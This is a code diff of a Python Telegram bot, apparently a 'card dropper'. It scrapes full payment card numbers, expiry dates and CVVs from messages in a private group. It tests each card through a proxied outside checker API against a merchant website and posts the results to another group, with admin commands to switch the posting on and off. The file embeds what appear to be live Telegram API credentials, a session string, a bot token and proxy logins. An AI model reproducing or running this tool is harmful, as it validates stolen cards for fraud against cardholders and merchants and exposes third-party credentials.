@@ -1,21 +1,18 @@
-# advanced_card_droper_fixed.py
 import re
 import aiohttp
 import asyncio
 import random
-import logging
-import time
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from typing import Optional, Set, Dict
+from telegram import Bot
+from telegram.helpers import escape_markdown
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # ---------------- CONFIG ----------------
-logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
-logger = logging.getLogger("droper")
-
 api_id = 17455551
 api_hash = "abde39d2fad230528b2695a14102e76a"
 SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="
+BOT_TOKEN = "7991358662:AAGQIQFKzKc4bHwJM_Sgt5MZ4nJZ4PhTpes"
 
 PRIVATE_GROUP_ID = -1002682944548
 TARGET_GROUP_ID = -1002968335063
@@ -23,176 +20,111 @@ ADMIN_ID = 8493360284
 
 API_URL = "https://autosh.arpitchk.shop/puto.php"
 SITE = "https://jasonwubeauty.com"
+
+# List of proxies
 PROXIES = ["45.41.172.51:5794:juftilus:atasaxde44jl"]
 
-NUM_CONCURRENT = 5
-GLOBAL_DEDUPE_SECONDS = 60 * 30  # 30 min dedupe window
+NUM_CONCURRENT = 5  # simultaneous API requests
 
-# ---------------- CLIENT & STATE ----------------
-client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
-session: Optional[aiohttp.ClientSession] = None
+# ---------------- CARD REGEX ----------------
+CARD_REGEX = re.compile(
+    r"(\d{15,16})\s*[\|/:]?\s*(\d{2})\s*[\|/:]?\s*(\d{2,4})\s*[\|/:]?\s*(\d{3,4})"
+)
+
+# ---------------- CLIENTS ----------------
+user_client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
+bot_client = Bot(token=BOT_TOKEN)
+session: aiohttp.ClientSession = None
+dropping_enabled = False
+
+# ---------------- SEMAPHORE ----------------
 semaphore = asyncio.Semaphore(NUM_CONCURRENT)
-_in_progress: Set[str] = set()
-_recent_processed: Dict[str, float] = {}
-_target_entity = TARGET_GROUP_ID  # use numeric ID directly
 
-# ---------------- REGEX (multiple formats) ----------------
-SIMPLE_REGEX = re.compile(
-    r"(?P<cc>\d{13,19})\D{0,6}(?P<mm>\d{2})\D{0,4}(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"
-)
-GROUPED_REGEX = re.compile(
-    r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4})\D{0,6}(?P<mm>\d{2})[\|\/\-]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"
-)
-FALLBACK_REGEX = re.compile(
-    r"(?P<t1>\d{12,19})\D{1,6}(?P<t2>\d{2})\D{1,6}(?P<t3>\d{2,4})\D{1,6}(?P<t4>\d{3,4})"
-)
-PATTERNS = (SIMPLE_REGEX, GROUPED_REGEX, FALLBACK_REGEX)
-_SEP_CLEAN = re.compile(r"[\s\-\.\|/]")
+# ---------------- FUNCTIONS ----------------
+async def check_card(card: str):
+    """Process card with API, respecting concurrency"""
+    global session
+    async with semaphore:
+        proxy = random.choice(PROXIES)
+        params = {"site": SITE, "cc": card, "proxy": proxy}
 
-def normalize_cc(cc_raw: str) -> str:
-    return _SEP_CLEAN.sub("", cc_raw)
-
-def normalize_year(yy: str) -> str:
-    yy = yy.strip()
-    return yy[-2:] if len(yy) == 4 else yy.zfill(2)
-
-def build_token(cc: str, mm: str, yy: str, cvv: str) -> Optional[str]:
-    cc_n = normalize_cc(cc)
-    if not (13 <= len(cc_n) <= 19):
-        return None
-    try:
-        mm_i = int(mm)
-        if not (1 <= mm_i <= 12):
-            return None
-    except:
-        return None
-    yy_n = normalize_year(yy)
-    cvv_n = re.sub(r"\D", "", cvv)
-    return f"{cc_n}|{mm_i:02d}|{yy_n}|{cvv_n}"
-
-# ---------------- API CALL ----------------
-async def call_api(card_token: str, retries: int = 2, timeout: int = 12) -> dict:
-    proxy_choice = random.choice(PROXIES) if PROXIES else ""
-    params = {"site": SITE, "cc": card_token, "proxy": proxy_choice}
-    backoff = 1.0
-    for attempt in range(retries + 1):
-        try:
-            async with session.get(API_URL, params=params, timeout=timeout) as resp:
-                text = await resp.text()
-                try:
-                    return await resp.json()
-                except:
-                    return {"Response": text.strip()}
-        except asyncio.CancelledError:
-            raise
-        except Exception as e:
-            if attempt < retries:
-                await asyncio.sleep(backoff)
-                backoff *= 2
-            else:
-                return {"Response": f"API Error: {e}"}
-    return {"Response": "Unknown error"}
-
-# ---------------- PROCESS / SENDING ----------------
-async def process_card(card_token: str):
-    now = time.time()
-    if _recent_processed.get(card_token) and (now - _recent_processed[card_token]) < GLOBAL_DEDUPE_SECONDS:
-        logger.info("Skipping recently processed card %s", card_token)
-        return
-    if card_token in _in_progress:
-        logger.info("Card already in progress %s", card_token)
-        return
-    _in_progress.add(card_token)
-    try:
-        async with semaphore:
-            logger.info("Processing card %s", card_token)
-            result = await call_api(card_token)
-            response = result.get("Response", "No response")
-            _recent_processed[card_token] = time.time()
-            cc = card_token.split("|")[0]
-            masked = f"{cc[:-4]}****{cc[-4:]}" if len(cc) > 8 else cc
-            stylish = f"💳 `{masked}` — {response}"
+        for attempt in range(3):
             try:
-                await client.send_message(_target_entity, stylish)
-                logger.info("Sent result for %s -> %s", card_token, response)
+                async with session.get(API_URL, params=params, timeout=15) as resp:
+                    data = await resp.json()
+                    break
             except Exception as e:
-                logger.warning("Failed to send result for %s: %s", card_token, e)
-    finally:
-        _in_progress.discard(card_token)
+                data = {"Response": f"API Error: {e}", "cc": card, "Price": "-", "TotalTime": "-"}
+                await asyncio.sleep(1)
 
-# ---------------- CLEANUP TASK ----------------
-async def _cleanup_recent_task():
-    while True:
-        await asyncio.sleep(60)
-        cutoff = time.time() - GLOBAL_DEDUPE_SECONDS
-        keys = [k for k, t in _recent_processed.items() if t < cutoff]
-        for k in keys:
-            _recent_processed.pop(k, None)
-        if len(_recent_processed) > 100000:
-            items = sorted(_recent_processed.items(), key=lambda it: it[1])
-            for k, _ in items[: len(items) // 2]:
-                _recent_processed.pop(k, None)
+        cc = escape_markdown(str(data.get("cc")), version=2)
+        price = escape_markdown(str(data.get("Price")), version=2)
+        response = escape_markdown(str(data.get("Response")), version=2)
+        msg = f"✨ *Card Check Result* ✨\n\n💳 CC: `{cc}`\n💰 Price: {price}\n📊 Response: {response}"
 
-# ---------------- MESSAGE HANDLER ----------------
-@client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
-async def on_new_msg(event):
-    text = event.raw_text or ""
-    if not text.strip():
-        return
-    for pat in PATTERNS:
-        m = pat.search(text)
-        if not m:
-            continue
-        gd = m.groupdict()
-        if gd:
-            cc = gd.get("cc") or gd.get("t1")
-            mm = gd.get("mm") or gd.get("t2")
-            yy = gd.get("yy") or gd.get("t3")
-            cvv = gd.get("cvv") or gd.get("t4")
+        if dropping_enabled:
+            try:
+                await bot_client.send_message(chat_id=TARGET_GROUP_ID, text=msg, parse_mode="MarkdownV2")
+                print(f"[✓] Sent: {card} -> {data.get('Response')}")
+            except Exception as e:
+                print(f"❌ Failed to send: {card} -> {e}")
         else:
-            groups = m.groups()
-            if len(groups) >= 4:
-                cc, mm, yy, cvv = groups[0], groups[1], groups[2], groups[3]
-            else:
-                continue
-        token = build_token(cc, mm, yy, cvv)
-        if token and token not in _recent_processed and token not in _in_progress:
-            asyncio.create_task(process_card(token))
-            logger.info("Scheduled card %s from message %s", token, event.id)
+            print(f"[i] Dropping disabled: {card} -> {data.get('Response')}")
 
-# ---------------- ADMIN COMMANDS ----------------
-dropping_enabled = True
-@client.on(events.NewMessage(from_users=ADMIN_ID))
-async def admin_handler(event):
-    txt = (event.raw_text or "").strip().lower()
-    if txt == "/start":
-        await event.reply("✅ Bot is running and listening for cards.")
-    elif txt == "/drop":
-        global dropping_enabled
-        dropping_enabled = True
-        await event.reply("✅ Dropping enabled.")
-    elif txt == "/stop":
-        dropping_enabled = False
-        await event.reply("⏹ Dropping disabled.")
-    elif txt == "/status":
-        await event.reply(f"✅ dropping: {dropping_enabled}\nrecent tokens: {len(_recent_processed)}")
-    else:
+# ---------------- TELETHON EVENT ----------------
+@user_client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
+async def card_listener(event):
+    text = event.message.message
+    if not text:
         return
+    matches = CARD_REGEX.findall(text)
+    if matches:
+        for match in matches:
+            card_str = "|".join(match)
+            asyncio.create_task(check_card(card_str))
+            print(f"[+] Card detected and processing immediately: {card_str}")
 
-# ---------------- STARTUP ----------------
+# ---------------- TELEGRAM COMMANDS ----------------
+async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await context.bot.send_message(update.effective_chat.id, "❌ Access Denied")
+        return
+    await context.bot.send_message(update.effective_chat.id, "✅ Send /drop to start dropping checked CC")
+
+async def drop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
+    global dropping_enabled
+    if update.effective_user.id != ADMIN_ID:
+        await context.bot.send_message(update.effective_chat.id, "❌ Access Denied")
+        return
+    dropping_enabled = True
+    await context.bot.send_message(update.effective_chat.id, "✅ Dropping enabled!")
+
+async def stop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
+    global dropping_enabled
+    if update.effective_user.id != ADMIN_ID:
+        await context.bot.send_message(update.effective_chat.id, "❌ Access Denied")
+        return
+    dropping_enabled = False
+    await context.bot.send_message(update.effective_chat.id, "⏹ Dropping stopped.")
+
+# ---------------- MAIN ----------------
 async def main():
     global session
     session = aiohttp.ClientSession()
-    try:
-        await client.start()
-        asyncio.create_task(_cleanup_recent_task())
-        logger.info("✅ Client started. Listening for messages in %s", PRIVATE_GROUP_ID)
-        await client.run_until_disconnected()
-    finally:
-        await session.close()
+
+    await user_client.start()
+    print("✅ Telethon client started")
+
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("drop", drop))
+    app.add_handler(CommandHandler("stop", stop))
+    await app.initialize()
+    await app.start()
+    await app.updater.start_polling()
+    print("✅ Telegram bot started. Waiting for admin commands...")
+
+    await user_client.run_until_disconnected()
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        logger.info("Stopped by user")
+    asyncio.run(main())
